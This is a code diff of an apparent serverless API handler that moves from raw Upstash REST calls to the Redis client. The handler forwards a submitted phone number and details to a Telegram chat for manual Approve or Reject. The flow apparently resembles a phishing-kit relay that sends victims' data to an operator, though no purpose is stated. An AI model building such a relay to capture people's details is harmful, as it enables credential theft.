@@ -1,62 +1,40 @@
-type ApiRequest = {
-    method?: string;
-    body?: unknown;
-};
+import type { VercelRequest, VercelResponse } from '@vercel/node';
+import { Redis } from "@upstash/redis";
 
-type ApiResponse = {
-    status: (code: number) => ApiResponse;
-    json: (body: unknown) => void;
-    send: (body: string) => void;
-};
-
-const redisCommand = async (command: string) => {
-    const url = process.env.UPSTASH_REDIS_REST_URL?.replace(/\/+$/, "");
-    const token = process.env.UPSTASH_REDIS_REST_TOKEN;
-
-    if (!url || !token) {
-        throw new Error("UPSTASH_REDIS_REST_URL / UPSTASH_REDIS_REST_TOKEN are not configured");
-    }
-
-    const response = await fetch(`${url}${command}`, {
-        headers: { Authorization: `Bearer ${token}` },
-    });
-    const payload = await response.json();
-
-    if (payload.error) {
-        throw new Error(`Upstash error: ${payload.error}`);
-    }
-
-    return payload.result;
-};
-
-export default async function handler(req: ApiRequest, res: ApiResponse) {
+export default async function handler(req: VercelRequest, res: VercelResponse) {
     if (req.method !== "POST") {
         return res.status(405).send("Method Not Allowed");
     }
 
     try {
-        const body = (typeof req.body === "string" ? JSON.parse(req.body) : req.body || {}) as {
-            type?: string;
-            phone?: string;
-            details?: string;
-        };
+        const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
+        const { type, name, phone, details } = body;
 
-        if (!body.phone) {
+        if (!phone) {
             return res.status(400).json({ success: false, message: "Phone number is required" });
         }
 
+        const redis = new Redis({
+            url: process.env.UPSTASH_REDIS_REST_URL || "",
+            token: process.env.UPSTASH_REDIS_REST_TOKEN || "",
+        });
+
         const attemptId = Math.random().toString(36).substring(2, 15);
-        await redisCommand(`/set/attempt:${attemptId}/pending/EX/300`);
+        await redis.set(`attempt:${attemptId}`, "pending", { ex: 300 });
 
         const botToken = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
         if (botToken && chatId) {
-            const message = `🔔 *New Approval Request*\n\n*Type:* ${body.type}\n*Phone:* ${body.phone}\n*Details:* ${body.details}\n\n*Attempt ID:* \`${attemptId}\``;
-
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            const message = `🔔 *New Approval Request*\n\n*Type:* ${type}\n*Phone:* ${phone}\n*Details:* ${details}\n\n*Attempt ID:* \`${attemptId}\``;
+            
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            await fetch(telegramUrl, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: {
+                    "Content-Type": "application/json",
+                },
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message,
@@ -65,19 +43,19 @@ export default async function handler(req: ApiRequest, res: ApiResponse) {
                         inline_keyboard: [
                             [
                                 { text: "✅ Approve", callback_data: `approve_${attemptId}` },
-                                { text: "❌ Reject", callback_data: `reject_${attemptId}` },
-                            ],
-                        ],
-                    },
+                                { text: "❌ Reject", callback_data: `reject_${attemptId}` }
+                            ]
+                        ]
+                    }
                 }),
             });
         } else {
-            console.warn("TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not configured — skipping notification");
+            console.warn("Telegram BOT token or Chat ID not configured. Skipping notification.");
         }
 
         return res.status(200).json({ success: true, attemptId });
     } catch (error) {
-        console.error("Callback error:", error);
+        console.error("Callback Error:", error);
         return res.status(500).json({ success: false, message: "Internal Server Error" });
     }
 }
